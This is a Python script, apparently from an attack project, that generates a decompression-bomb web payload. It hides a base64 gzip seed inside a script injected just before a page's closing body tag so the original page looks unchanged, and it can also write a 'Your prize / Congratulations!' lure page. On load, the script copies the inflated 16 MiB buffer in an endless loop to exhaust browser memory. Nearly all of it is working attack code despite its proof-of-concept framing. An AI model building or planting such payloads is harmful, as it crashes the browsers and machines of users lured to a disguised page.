#!/usr/bin/env python3
"""Insert a script into the prize page without removing its existing markup

The script inflates a gzip seed and allocates copies after the page loads
browser_demo.py runs a bounded copy in Chromium; no test triggers browser OOM
See attack2/README.md for the attack chain and its proof limits
"""
import base64
import gzip


def _gzip_seed(zeros):
    """A gzip stream of `zeros` zero bytes -- tiny on disk, large when inflated."""
    return gzip.compress(b"\x00" * zeros, compresslevel=9, mtime=0)


_SCRIPT = """<script>
/* Proof of concept: a {seed_kib} KiB gzip stream expands to {unit_mib} MiB per copy
   The script leaves the page markup in place; unbounded browser behavior is not verified */
(function () {{
  var SEED_B64 = "{seed_b64}";
  function b64ToBytes(s) {{
    var bin = atob(s), u = new Uint8Array(bin.length);
    for (var i = 0; i < bin.length; i++) u[i] = bin.charCodeAt(i);
    return u;
  }}
  async function inflate(bytes) {{
    var ds = new DecompressionStream("gzip");
    var w = ds.writable.getWriter(); w.write(bytes); w.close();
    var ab = await new Response(ds.readable).arrayBuffer();
    return new Uint8Array(ab);               // real memory, not sparse
  }}
  var hold = [];
  window.addEventListener("load", async function () {{
    var unit = await inflate(b64ToBytes(SEED_B64));
    while (true) {{
      hold.push(unit.slice());
      await new Promise(function (r) {{ setTimeout(r, 0); }});
    }}
  }});
}})();
</script>"""


def payload_script(unit_mib=16):
    """Return the injectable <script> block carrying the bomb, as text."""
    seed = _gzip_seed(unit_mib * 1024 * 1024)
    return _SCRIPT.format(
        seed_b64=base64.b64encode(seed).decode("ascii"),
        seed_kib=max(1, len(seed) // 1024),
        unit_mib=unit_mib,
    )


def inject_bomb(html, unit_mib=16):
    """Inject the bomb script into `html` (bytes), keeping the page look-alike.

    The script goes just before </body> (else </html>, else at the end), so the
    original markup renders unchanged. Returns the modified HTML as bytes.
    """
    script = payload_script(unit_mib).encode("utf-8")
    text = html
    low = text.lower()
    for anchor in (b"</body>", b"</html>"):
        i = low.rfind(anchor)
        if i != -1:
            return text[:i] + script + b"\n" + text[i:]
    return text + b"\n" + script


def make_bomb_html(unit_mib=16):
    """Standalone minimal bomb page (used when there is no original to inject into)."""
    page = (b"<!DOCTYPE html>\n<html lang=\"en\"><head><meta charset=\"utf-8\">"
            b"<title>Your prize</title></head><body>\n"
            b"<h1>Congratulations!</h1>\n</body></html>\n")
    return inject_bomb(page, unit_mib)


if __name__ == "__main__":
    import sys
    out = sys.argv[1] if len(sys.argv) > 1 else "prize.html"
    data = make_bomb_html()
    with open(out, "wb") as f:
        f.write(data)
    print(f"wrote {out}: {len(data)} bytes (each held copy commits 16 MiB of RAM)")
